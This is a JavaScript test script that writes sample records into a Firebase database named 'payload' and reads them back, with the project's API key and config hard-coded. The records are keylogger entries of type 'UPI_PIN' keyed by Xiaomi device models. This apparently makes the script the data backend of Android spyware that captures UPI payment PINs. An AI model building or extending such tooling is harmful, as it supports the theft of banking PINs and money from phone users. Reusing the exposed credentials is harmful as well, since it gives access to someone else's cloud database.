// Test script to add sample KeyLogs data to Firebase
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Sample KeyLogs data with new structure - using actual device IDs
const sampleKeyLogs = {
  "Xiaomi 23076PC4BI": {
    "log1": {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:09:00",
      Column1: "1",
      Column2: "2", 
      Column3: "3",
      Column4: "4",
      Column5: "5",
      Column6: "6"
    },
    "log2": {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:08:00",
      Column1: "7",
      Column2: "8",
      Column3: "9", 
      Column4: "0",
      Column5: "1",
      Column6: "2"
    }
  },
  "Xiaomi M2103K19PI": {
    "log1": {
      keylogger: "UPI_PIN",
      timestamp: "22-05-2025 02:07:00",
      Column1: "3",
      Column2: "4",
      Column3: "5",
      Column4: "6",
      Column5: "7",
      Column6: "8"
    }
  }
};

// Add the data to Firebase
async function addTestData() {
  try {
    console.log('Adding test KeyLogs data...');
    
    for (const [deviceId, logs] of Object.entries(sampleKeyLogs)) {
      for (const [logId, logData] of Object.entries(logs)) {
        await set(ref(database, `KeyLogs/${deviceId}/${logId}`), logData);
        console.log(`Added log ${logId} for device ${deviceId}`);
      }
    }
    
    console.log('Test data added successfully!');
  } catch (error) {
    console.error('Error adding test data:', error);
  }
}

// Test retrieving the data
async function testRetrieveData() {
  try {
    console.log('Testing data retrieval...');
    
    for (const deviceId of Object.keys(sampleKeyLogs)) {
      const snapshot = await get(ref(database, `KeyLogs/${deviceId}`));
      const data = snapshot.val();
      console.log(`Retrieved data for ${deviceId}:`, data);
      
      if (data) {
        const logs = Object.values(data);
        console.log(`Total logs for ${deviceId}:`, logs.length);
        
        // Test the new structure
        logs.forEach((log, index) => {
          console.log(`Log ${index + 1}:`, {
            keylogger: log.keylogger,
            timestamp: log.timestamp,
            columns: [log.Column1, log.Column2, log.Column3, log.Column4, log.Column5, log.Column6]
          });
        });
      }
    }
  } catch (error) {
    console.error('Error retrieving test data:', error);
  }
}

// Run the functions
async function runTests() {
  await addTestData();
  console.log('\n--- Testing Data Retrieval ---');
  await testRetrieveData();
}

runTests();
